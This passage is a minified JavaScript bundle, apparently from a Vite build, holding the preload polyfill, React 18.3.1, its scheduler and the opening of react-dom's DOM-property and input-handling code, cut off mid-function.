function uE(e,t){for(var r=0;r<t.length;r++){const a=t[r];if(typeof a!="string"&&!Array.isArray(a)){for(const o in a)if(o!=="default"&&!(o in e)){const s=Object.getOwnPropertyDescriptor(a,o);s&&Object.defineProperty(e,o,s.get?s:{enumerable:!0,get:()=>a[o]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const o of document.querySelectorAll('link[rel="modulepreload"]'))a(o);new MutationObserver(o=>{for(const s of o)if(s.type==="childList")for(const l of s.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&a(l)}).observe(document,{childList:!0,subtree:!0});function r(o){const s={};return o.integrity&&(s.integrity=o.integrity),o.referrerPolicy&&(s.referrerPolicy=o.referrerPolicy),o.crossOrigin==="use-credentials"?s.credentials="include":o.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function a(o){if(o.ep)return;o.ep=!0;const s=r(o);fetch(o.href,s)}})();function yo(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var xl={exports:{}},da={},Al={exports:{}},Oe={};var x0;function oE(){if(x0)return Oe;x0=1;var e=Symbol.for("react.element"),t=Symbol.for("react.portal"),r=Symbol.for("react.fragment"),a=Symbol.for("react.strict_mode"),o=Symbol.for("react.profiler"),s=Symbol.for("react.provider"),l=Symbol.for("react.context"),h=Symbol.for("react.forward_ref"),p=Symbol.for("react.suspense"),g=Symbol.for("react.memo"),T=Symbol.for("react.lazy"),E=Symbol.iterator;function _(O){return O===null||typeof O!="object"?null:(O=E&&O[E]||O["@@iterator"],typeof O=="function"?O:null)}var S={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},I=Object.assign,F={};function P(O,X,L){this.props=O,this.context=X,this.refs=F,this.updater=L||S}P.prototype.isReactComponent={},P.prototype.setState=function(O,X){if(typeof O!="object"&&typeof O!="function"&&O!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,O,X,"setState")},P.prototype.forceUpdate=function(O){this.updater.enqueueForceUpdate(this,O,"forceUpdate")};function w(){}w.prototype=P.prototype;function Q(O,X,L){this.props=O,this.context=X,this.refs=F,this.updater=L||S}var j=Q.prototype=new w;j.constructor=Q,I(j,P.prototype),j.isPureReactComponent=!0;var ie=Array.isArray,de=Object.prototype.hasOwnProperty,z={current:null},me={key:!0,ref:!0,__self:!0,__source:!0};function Se(O,X,L){var _e,Ne={},be=null,Be=null;if(X!=null)for(_e in X.ref!==void 0&&(Be=X.ref),X.key!==void 0&&(be=""+X.key),X)de.call(X,_e)&&!me.hasOwnProperty(_e)&&(Ne[_e]=X[_e]);var ve=arguments.length-2;if(ve===1)Ne.children=L;else if(1<ve){for(var Ue=Array(ve),nt=0;nt<ve;nt++)Ue[nt]=arguments[nt+2];Ne.children=Ue}if(O&&O.defaultProps)for(_e in ve=O.defaultProps,ve)Ne[_e]===void 0&&(Ne[_e]=ve[_e]);return{$$typeof:e,type:O,key:be,ref:Be,props:Ne,_owner:z.current}}function xe(O,X){return{$$typeof:e,type:O.type,key:X,ref:O.ref,props:O.props,_owner:O._owner}}function H(O){return typeof O=="object"&&O!==null&&O.$$typeof===e}function ue(O){var X={"=":"=0",":":"=2"};return"$"+O.replace(/[=:]/g,function(L){return X[L]})}var oe=/\/+/g;function Ae(O,X){return typeof O=="object"&&O!==null&&O.key!=null?ue(""+O.key):X.toString(36)}function ce(O,X,L,_e,Ne){var be=typeof O;(be==="undefined"||be==="boolean")&&(O=null);var Be=!1;if(O===null)Be=!0;else switch(be){case"string":case"number":Be=!0;break;case"object":switch(O.$$typeof){case e:case t:Be=!0}}if(Be)return Be=O,Ne=Ne(Be),O=_e===""?"."+Ae(Be,0):_e,ie(Ne)?(L="",O!=null&&(L=O.replace(oe,"$&/")+"/"),ce(Ne,X,L,"",function(nt){return nt})):Ne!=null&&(H(Ne)&&(Ne=xe(Ne,L+(!Ne.key||Be&&Be.key===Ne.key?"":(""+Ne.key).replace(oe,"$&/")+"/")+O)),X.push(Ne)),1;if(Be=0,_e=_e===""?".":_e+":",ie(O))for(var ve=0;ve<O.length;ve++){be=O[ve];var Ue=_e+Ae(be,ve);Be+=ce(be,X,L,Ue,Ne)}else if(Ue=_(O),typeof Ue=="function")for(O=Ue.call(O),ve=0;!(be=O.next()).done;)be=be.value,Ue=_e+Ae(be,ve++),Be+=ce(be,X,L,Ue,Ne);else if(be==="object")throw X=String(O),Error("Objects are not valid as a React child (found: "+(X==="[object Object]"?"object with keys {"+Object.keys(O).join(", ")+"}":X)+"). If you meant to render a collection of children, use an array instead.");return Be}function re(O,X,L){if(O==null)return O;var _e=[],Ne=0;return ce(O,_e,"","",function(be){return X.call(L,be,Ne++)}),_e}function Le(O){if(O._status===-1){var X=O._result;X=X(),X.then(function(L){(O._status===0||O._status===-1)&&(O._status=1,O._result=L)},function(L){(O._status===0||O._status===-1)&&(O._status=2,O._result=L)}),O._status===-1&&(O._status=0,O._result=X)}if(O._status===1)return O._result.default;throw O._result}var ke={current:null},ee={transition:null},pe={ReactCurrentDispatcher:ke,ReactCurrentBatchConfig:ee,ReactCurrentOwner:z};function C(){throw Error("act(...) is not supported in production builds of React.")}return Oe.Children={map:re,forEach:function(O,X,L){re(O,function(){X.apply(this,arguments)},L)},count:function(O){var X=0;return re(O,function(){X++}),X},toArray:function(O){return re(O,function(X){return X})||[]},only:function(O){if(!H(O))throw Error("React.Children.only expected to receive a single React element child.");return O}},Oe.Component=P,Oe.Fragment=r,Oe.Profiler=o,Oe.PureComponent=Q,Oe.StrictMode=a,Oe.Suspense=p,Oe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=pe,Oe.act=C,Oe.cloneElement=function(O,X,L){if(O==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+O+".");var _e=I({},O.props),Ne=O.key,be=O.ref,Be=O._owner;if(X!=null){if(X.ref!==void 0&&(be=X.ref,Be=z.current),X.key!==void 0&&(Ne=""+X.key),O.type&&O.type.defaultProps)var ve=O.type.defaultProps;for(Ue in X)de.call(X,Ue)&&!me.hasOwnProperty(Ue)&&(_e[Ue]=X[Ue]===void 0&&ve!==void 0?ve[Ue]:X[Ue])}var Ue=arguments.length-2;if(Ue===1)_e.children=L;else if(1<Ue){ve=Array(Ue);for(var nt=0;nt<Ue;nt++)ve[nt]=arguments[nt+2];_e.children=ve}return{$$typeof:e,type:O.type,key:Ne,ref:be,props:_e,_owner:Be}},Oe.createContext=function(O){return O={$$typeof:l,_currentValue:O,_currentValue2:O,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},O.Provider={$$typeof:s,_context:O},O.Consumer=O},Oe.createElement=Se,Oe.createFactory=function(O){var X=Se.bind(null,O);return X.type=O,X},Oe.createRef=function(){return{current:null}},Oe.forwardRef=function(O){return{$$typeof:h,render:O}},Oe.isValidElement=H,Oe.lazy=function(O){return{$$typeof:T,_payload:{_status:-1,_result:O},_init:Le}},Oe.memo=function(O,X){return{$$typeof:g,type:O,compare:X===void 0?null:X}},Oe.startTransition=function(O){var X=ee.transition;ee.transition={};try{O()}finally{ee.transition=X}},Oe.unstable_act=C,Oe.useCallback=function(O,X){return ke.current.useCallback(O,X)},Oe.useContext=function(O){return ke.current.useContext(O)},Oe.useDebugValue=function(){},Oe.useDeferredValue=function(O){return ke.current.useDeferredValue(O)},Oe.useEffect=function(O,X){return ke.current.useEffect(O,X)},Oe.useId=function(){return ke.current.useId()},Oe.useImperativeHandle=function(O,X,L){return ke.current.useImperativeHandle(O,X,L)},Oe.useInsertionEffect=function(O,X){return ke.current.useInsertionEffect(O,X)},Oe.useLayoutEffect=function(O,X){return ke.current.useLayoutEffect(O,X)},Oe.useMemo=function(O,X){return ke.current.useMemo(O,X)},Oe.useReducer=function(O,X,L){return ke.current.useReducer(O,X,L)},Oe.useRef=function(O){return ke.current.useRef(O)},Oe.useState=function(O){return ke.current.useState(O)},Oe.useSyncExternalStore=function(O,X,L){return ke.current.useSyncExternalStore(O,X,L)},Oe.useTransition=function(){return ke.current.useTransition()},Oe.version="18.3.1",Oe}var A0;function Tc(){return A0||(A0=1,Al.exports=oE()),Al.exports}var L0;function sE(){if(L0)return da;L0=1;var e=Tc(),t=Symbol.for("react.element"),r=Symbol.for("react.fragment"),a=Object.prototype.hasOwnProperty,o=e.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,s={key:!0,ref:!0,__self:!0,__source:!0};function l(h,p,g){var T,E={},_=null,S=null;g!==void 0&&(_=""+g),p.key!==void 0&&(_=""+p.key),p.ref!==void 0&&(S=p.ref);for(T in p)a.call(p,T)&&!s.hasOwnProperty(T)&&(E[T]=p[T]);if(h&&h.defaultProps)for(T in p=h.defaultProps,p)E[T]===void 0&&(E[T]=p[T]);return{$$typeof:t,type:h,key:_,ref:S,props:E,_owner:o.current}}return da.Fragment=r,da.jsx=l,da.jsxs=l,da}var k0;function lE(){return k0||(k0=1,xl.exports=sE()),xl.exports}var v=lE(),ne=Tc();const fi=yo(ne),cE=uE({__proto__:null,default:fi},[ne]);var to={},Ll={exports:{}},Ot={},kl={exports:{}},Il={};var I0;function dE(){return I0||(I0=1,(function(e){function t(ee,pe){var C=ee.length;ee.push(pe);e:for(;0<C;){var O=C-1>>>1,X=ee[O];if(0<o(X,pe))ee[O]=pe,ee[C]=X,C=O;else break e}}function r(ee){return ee.length===0?null:ee[0]}function a(ee){if(ee.length===0)return null;var pe=ee[0],C=ee.pop();if(C!==pe){ee[0]=C;e:for(var O=0,X=ee.length,L=X>>>1;O<L;){var _e=2*(O+1)-1,Ne=ee[_e],be=_e+1,Be=ee[be];if(0>o(Ne,C))be<X&&0>o(Be,Ne)?(ee[O]=Be,ee[be]=C,O=be):(ee[O]=Ne,ee[_e]=C,O=_e);else if(be<X&&0>o(Be,C))ee[O]=Be,ee[be]=C,O=be;else break e}}return pe}function o(ee,pe){var C=ee.sortIndex-pe.sortIndex;return C!==0?C:ee.id-pe.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;e.unstable_now=function(){return s.now()}}else{var l=Date,h=l.now();e.unstable_now=function(){return l.now()-h}}var p=[],g=[],T=1,E=null,_=3,S=!1,I=!1,F=!1,P=typeof setTimeout=="function"?setTimeout:null,w=typeof clearTimeout=="function"?clearTimeout:null,Q=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function j(ee){for(var pe=r(g);pe!==null;){if(pe.callback===null)a(g);else if(pe.startTime<=ee)a(g),pe.sortIndex=pe.expirationTime,t(p,pe);else break;pe=r(g)}}function ie(ee){if(F=!1,j(ee),!I)if(r(p)!==null)I=!0,Le(de);else{var pe=r(g);pe!==null&&ke(ie,pe.startTime-ee)}}function de(ee,pe){I=!1,F&&(F=!1,w(Se),Se=-1),S=!0;var C=_;try{for(j(pe),E=r(p);E!==null&&(!(E.expirationTime>pe)||ee&&!ue());){var O=E.callback;if(typeof O=="function"){E.callback=null,_=E.priorityLevel;var X=O(E.expirationTime<=pe);pe=e.unstable_now(),typeof X=="function"?E.callback=X:E===r(p)&&a(p),j(pe)}else a(p);E=r(p)}if(E!==null)var L=!0;else{var _e=r(g);_e!==null&&ke(ie,_e.startTime-pe),L=!1}return L}finally{E=null,_=C,S=!1}}var z=!1,me=null,Se=-1,xe=5,H=-1;function ue(){return!(e.unstable_now()-H<xe)}function oe(){if(me!==null){var ee=e.unstable_now();H=ee;var pe=!0;try{pe=me(!0,ee)}finally{pe?Ae():(z=!1,me=null)}}else z=!1}var Ae;if(typeof Q=="function")Ae=function(){Q(oe)};else if(typeof MessageChannel<"u"){var ce=new MessageChannel,re=ce.port2;ce.port1.onmessage=oe,Ae=function(){re.postMessage(null)}}else Ae=function(){P(oe,0)};function Le(ee){me=ee,z||(z=!0,Ae())}function ke(ee,pe){Se=P(function(){ee(e.unstable_now())},pe)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(ee){ee.callback=null},e.unstable_continueExecution=function(){I||S||(I=!0,Le(de))},e.unstable_forceFrameRate=function(ee){0>ee||125<ee?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):xe=0<ee?Math.floor(1e3/ee):5},e.unstable_getCurrentPriorityLevel=function(){return _},e.unstable_getFirstCallbackNode=function(){return r(p)},e.unstable_next=function(ee){switch(_){case 1:case 2:case 3:var pe=3;break;default:pe=_}var C=_;_=pe;try{return ee()}finally{_=C}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(ee,pe){switch(ee){case 1:case 2:case 3:case 4:case 5:break;default:ee=3}var C=_;_=ee;try{return pe()}finally{_=C}},e.unstable_scheduleCallback=function(ee,pe,C){var O=e.unstable_now();switch(typeof C=="object"&&C!==null?(C=C.delay,C=typeof C=="number"&&0<C?O+C:O):C=O,ee){case 1:var X=-1;break;case 2:X=250;break;case 5:X=1073741823;break;case 4:X=1e4;break;default:X=5e3}return X=C+X,ee={id:T++,callback:pe,priorityLevel:ee,startTime:C,expirationTime:X,sortIndex:-1},C>O?(ee.sortIndex=C,t(g,ee),r(p)===null&&ee===r(g)&&(F?(w(Se),Se=-1):F=!0,ke(ie,C-O))):(ee.sortIndex=X,t(p,ee),I||S||(I=!0,Le(de))),ee},e.unstable_shouldYield=ue,e.unstable_wrapCallback=function(ee){var pe=_;return function(){var C=_;_=pe;try{return ee.apply(this,arguments)}finally{_=C}}}})(Il)),Il}var N0;function fE(){return N0||(N0=1,kl.exports=dE()),kl.exports}var v0;function hE(){if(v0)return Ot;v0=1;var e=Tc(),t=fE();function r(n){for(var i="https://reactjs.org/docs/error-decoder.html?invariant="+n,u=1;u<arguments.length;u++)i+="&args[]="+encodeURIComponent(arguments[u]);return"Minified React error #"+n+"; visit "+i+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var a=new Set,o={};function s(n,i){l(n,i),l(n+"Capture",i)}function l(n,i){for(o[n]=i,n=0;n<i.length;n++)a.add(i[n])}var h=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),p=Object.prototype.hasOwnProperty,g=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,T={},E={};function _(n){return p.call(E,n)?!0:p.call(T,n)?!1:g.test(n)?E[n]=!0:(T[n]=!0,!1)}function S(n,i,u,c){if(u!==null&&u.type===0)return!1;switch(typeof i){case"function":case"symbol":return!0;case"boolean":return c?!1:u!==null?!u.acceptsBooleans:(n=n.toLowerCase().slice(0,5),n!=="data-"&&n!=="aria-");default:return!1}}function I(n,i,u,c){if(i===null||typeof i>"u"||S(n,i,u,c))return!0;if(c)return!1;if(u!==null)switch(u.type){case 3:return!i;case 4:return i===!1;case 5:return isNaN(i);case 6:return isNaN(i)||1>i}return!1}function F(n,i,u,c,f,m,b){this.acceptsBooleans=i===2||i===3||i===4,this.attributeName=c,this.attributeNamespace=f,this.mustUseProperty=u,this.propertyName=n,this.type=i,this.sanitizeURL=m,this.removeEmptyString=b}var P={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(n){P[n]=new F(n,0,!1,n,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(n){var i=n[0];P[i]=new F(i,1,!1,n[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(n){P[n]=new F(n,2,!1,n.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(n){P[n]=new F(n,2,!1,n,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(n){P[n]=new F(n,3,!1,n.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(n){P[n]=new F(n,3,!0,n,null,!1,!1)}),["capture","download"].forEach(function(n){P[n]=new F(n,4,!1,n,null,!1,!1)}),["cols","rows","size","span"].forEach(function(n){P[n]=new F(n,6,!1,n,null,!1,!1)}),["rowSpan","start"].forEach(function(n){P[n]=new F(n,5,!1,n.toLowerCase(),null,!1,!1)});var w=/[\-:]([a-z])/g;function Q(n){return n[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(n){var i=n.replace(w,Q);P[i]=new F(i,1,!1,n,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(n){var i=n.replace(w,Q);P[i]=new F(i,1,!1,n,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(n){var i=n.replace(w,Q);P[i]=new F(i,1,!1,n,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(n){P[n]=new F(n,1,!1,n.toLowerCase(),null,!1,!1)}),P.xlinkHref=new F("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(n){P[n]=new F(n,1,!1,n.toLowerCase(),null,!0,!0)});function j(n,i,u,c){var f=P.hasOwnProperty(i)?P[i]:null;(f!==null?f.type!==0:c||!(2<i.length)||i[0]!=="o"&&i[0]!=="O"||i[1]!=="n"&&i[1]!=="N")&&(I(i,u,f,c)&&(u=null),c||f===null?_(i)&&(u===null?n.removeAttribute(i):n.setAttribute(i,""+u)):f.mustUseProperty?n[f.propertyName]=u===null?f.type===3?!1:"":u:(i=f.attributeName,c=f.attributeNamespace,u===null?n.removeAttribute(i):(f=f.type,u=f===3||f===4&&u===!0?"":""+u,c?n.setAttributeNS(c,i,u):n.setAttribute(i,u))))}var ie=e.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,de=Symbol.for("react.element"),z=Symbol.for("react.portal"),me=Symbol.for("react.fragment"),Se=Symbol.for("react.strict_mode"),xe=Symbol.for("react.profiler"),H=Symbol.for("react.provider"),ue=Symbol.for("react.context"),oe=Symbol.for("react.forward_ref"),Ae=Symbol.for("react.suspense"),ce=Symbol.for("react.suspense_list"),re=Symbol.for("react.memo"),Le=Symbol.for("react.lazy"),ke=Symbol.for("react.offscreen"),ee=Symbol.iterator;function pe(n){return n===null||typeof n!="object"?null:(n=ee&&n[ee]||n["@@iterator"],typeof n=="function"?n:null)}var C=Object.assign,O;function X(n){if(O===void 0)try{throw Error()}catch(u){var i=u.stack.trim().match(/\n( *(at )?)/);O=i&&i[1]||""}return`
`+O+n}var L=!1;function _e(n,i){if(!n||L)return"";L=!0;var u=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(i)if(i=function(){throw Error()},Object.defineProperty(i.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(i,[])}catch(U){var c=U}Reflect.construct(n,[],i)}else{try{i.call()}catch(U){c=U}n.call(i.prototype)}else{try{throw Error()}catch(U){c=U}n()}}catch(U){if(U&&c&&typeof U.stack=="string"){for(var f=U.stack.split(`
`),m=c.stack.split(`
`),b=f.length-1,A=m.length-1;1<=b&&0<=A&&f[b]!==m[A];)A--;for(;1<=b&&0<=A;b--,A--)if(f[b]!==m[A]){if(b!==1||A!==1)do if(b--,A--,0>A||f[b]!==m[A]){var N=`
`+f[b].replace(" at new "," at ");return n.displayName&&N.includes("<anonymous>")&&(N=N.replace("<anonymous>",n.displayName)),N}while(1<=b&&0<=A);break}}}finally{L=!1,Error.prepareStackTrace=u}return(n=n?n.displayName||n.name:"")?X(n):""}function Ne(n){switch(n.tag){case 5:return X(n.type);case 16:return X("Lazy");case 13:return X("Suspense");case 19:return X("SuspenseList");case 0:case 2:case 15:return n=_e(n.type,!1),n;case 11:return n=_e(n.type.render,!1),n;case 1:return n=_e(n.type,!0),n;default:return""}}function be(n){if(n==null)return null;if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n;switch(n){case me:return"Fragment";case z:return"Portal";case xe:return"Profiler";case Se:return"StrictMode";case Ae:return"Suspense";case ce:return"SuspenseList"}if(typeof n=="object")switch(n.$$typeof){case ue:return(n.displayName||"Context")+".Consumer";case H:return(n._context.displayName||"Context")+".Provider";case oe:var i=n.render;return n=n.displayName,n||(n=i.displayName||i.name||"",n=n!==""?"ForwardRef("+n+")":"ForwardRef"),n;case re:return i=n.displayName||null,i!==null?i:be(n.type)||"Memo";case Le:i=n._payload,n=n._init;try{return be(n(i))}catch{}}return null}function Be(n){var i=n.type;switch(n.tag){case 24:return"Cache";case 9:return(i.displayName||"Context")+".Consumer";case 10:return(i._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return n=i.render,n=n.displayName||n.name||"",i.displayName||(n!==""?"ForwardRef("+n+")":"ForwardRef");case 7:return"Fragment";case 5:return i;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return be(i);case 8:return i===Se?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof i=="function")return i.displayName||i.name||null;if(typeof i=="string")return i}return null}function ve(n){switch(typeof n){case"boolean":case"number":case"string":case"undefined":return n;case"object":return n;default:return""}}function Ue(n){var i=n.type;return(n=n.nodeName)&&n.toLowerCase()==="input"&&(i==="checkbox"||i==="radio")}function nt(n){var i=Ue(n)?"checked":"value",u=Object.getOwnPropertyDescriptor(n.constructor.prototype,i),c=""+n[i];if(!n.hasOwnProperty(i)&&typeof u<"u"&&typeof u.get=="function"&&typeof u.set=="function"){var f=u.get,m=u.set;return Object.defineProperty(n,i,{configurable:!0,get:function(){return f.call(this)},set:function(b){c=""+b,m.call(this,b)}}),Object.defineProperty(n,i,{enumerable:u.enumerable}),{getValue:function(){return c},setValue:function(b){c=""+b},stopTracking:function(){n._valueTracker=null,delete n[i]}}}}function _n(n){n._valueTracker||(n._valueTracker=nt(n))}function ja(n){if(!n)return!1;var i=n._valueTracker;if(!i)return!0;var u=i.getValue(),c="";return n&&(c=Ue(n)?n.checked?"true":"false":n.value),n=c,n!==u?(i.setValue(n),!0):!1}function Dr(n){if(n=n||(typeof document<"u"?document:void 0),typeof n>"u")return null;try{return n.activeElement||n.body}catch{return n.body}}function Ai(n,i){var u=i.checked;return C({},i,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:u??n._wrapperState.initialChecked})}function Li(n,i){var u=i.defaultValue==null?"":i.defaultValue,c=i.checked!=null?i.checked:i.defaultChecked;u=ve(i.value!=null?i.value:u),n._wrapperState={initialChecked:c,initialValue:u,controlled:i.type==="checkbox"||i.type==="radio"?i.checked!=null:i.value!=null}}function ki(n,i){i=i.checked,i!=null&&j(n,"checked",i,!1)}function Mr(n,i){ki(n,i);var u=ve(i.value),c=i.type;if(u!=null)c==="number"?(u===0&&n.value===""||n.value!=u)&&(n.value=""+u):n.value!==""+u&&(n.value=""+u);else if(c==="submit"||c==="reset"){n.removeAttribute("value");return}i.hasOwnProperty("value")?Fr(n,i.type,u):i.hasOwnProperty("defaultValue")&&Fr(n,i.type,ve(i.defaultValue)),i.checked==null&&i.defaultChecked!=null&&(n.defaultChecked=!!i.defaultChecked)}function Qa(n,i,u){if(i.hasOwnProperty("value")||i.hasOwnProperty("defaultValue")){var c=i.type;if(!(c!=="submit"&&c!=="reset"||i.value!==void 0&&i.value!==null))return;i=""+n._wrapperState.initialValue,u||i===n.value||(n.value=i),n.defaultValue=i}u=n.name,u!==""&&(n.name=""),n.defaultChecked=!!n._wrapperState.initialChecked,u!==""&&(n.name=u)}function Fr(n,i,u){(i!=="number"||Dr(n.ownerDocument)!==n)&&(u==null?n.defaultValue=""+n._wrapperState.initialValue:n.defaultValue!==""+u&&(n.defaultValue=""+u))}var Pn=Array.isArray;function wn(n,i,u,c){if(n=n.options,i){i={};for(var f=0;f<u.length;f++)i["$"+u[f]]=!0;for(u=0;u<n.length;u++)f=i.hasOwnProperty("$"+n[u].value),n[u].selected!==f&&(n[u].selected=f),f&&c&&(n[u].defaultSelected=!0)}else{for(u=""+ve(u),i=null,f=0;f<n.length;f++){if(n[f].value===u){n[f].selected=!0,c&&(n[f].defaultSelected=!0);return}i!==null||n[f].disabled||(i=n[f])}i!==null&&(i.selected=!0)}}function Ii(n,i){if(i.dangerouslySetInnerHTML!=null)throw Error(r(91));return C({},i,{value:void 0,defaultValue:void 0,children:""+n._wrapperState.initialValue})}function Ya(n,i){var u=i.value;if(u==null){if(u=i.children,i=i.defaultValue,u!=null){if(i!=null)throw Error(r(92));if(Pn(u)){if(1<u.length)throw Error(r(93));u=u[0]}i=u}i==null&&(i=""),u=i}n._wrapperState={initialValue:ve(u)}}function Xa(n,i){var u=ve(i.value),c=ve(i.defaultValue);u!=null&&(u=""+u,u!==n.value&&(n.value=u),i.defaultValue==null&&n.defaultValue!==u&&(n.defaultValue=u)),c!=null&&(n.defaultValue=""+c)}function Ga(n){var i=n.textContent;i===n._wrapperState.initialValue&&i!==""&&i!==null&&(n.value=i)}function Y(n){switch(n){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function te(n,i){return n==null||n==="http://www.w3.org/1999/xhtml"?Y(i):n==="http://www.w3.org/2000/svg"&&i==="foreignObject"?"http://www.w3.org/1999/xhtml":n}var ye,Re=(function(n){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(i,u,c,f){MSApp.execUnsafeLocalFunction(function(){return n(i,u,c,f)})}:n})(function(n,i){if(n.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in n)n.innerHTML=i;else{for(ye=ye||document.createElement("div"),ye.innerHTML="<svg>"+i.valueOf().toString()+"</svg>",i=ye.firstChild;n.firstChild;)n.removeChild(n.firstChild);for(;i.firstChild;)n.appendChild(i.firstChild)}});function Me(n,i){if(i){var u=n.firstChild;if(u&&u===n.lastChild&&u.nodeType===3){u.nodeValue=i;return}}n.textContent=i}var ht={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Sn=["Webkit","ms","Moz","O"];Object.keys(ht).forEach(function(n){Sn.forEach(function(i){i=i+n.charAt(0).toUpperCase()+n.substring(1),ht[i]=ht[n]})});function jt(n,i,u){return i==null||typeof i=="boolean"||i===""?"":u||typeof i!="number"||i===0||ht.hasOwnProperty(n)&&ht[n]?(""+i).trim():i+"px"}function Dn(n,i){n=n.style;for(var u in i)if(i.hasOwnProperty(u)){var c=u.indexOf("--")===0,f=jt(u,i[u],c);u==="float"&&(u="cssFloat"),c?n.setProperty(u,f):n[u]=f}}var fr=C({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function pt(n,i){if(i){if(fr[n]&&(i.children!=null||i.dangerouslySetInnerHTML!=null))throw Error(r(137,n));if(i.dangerouslySetInnerHTML!=null){if(i.children!=null)throw Error(r(60));if(typeof 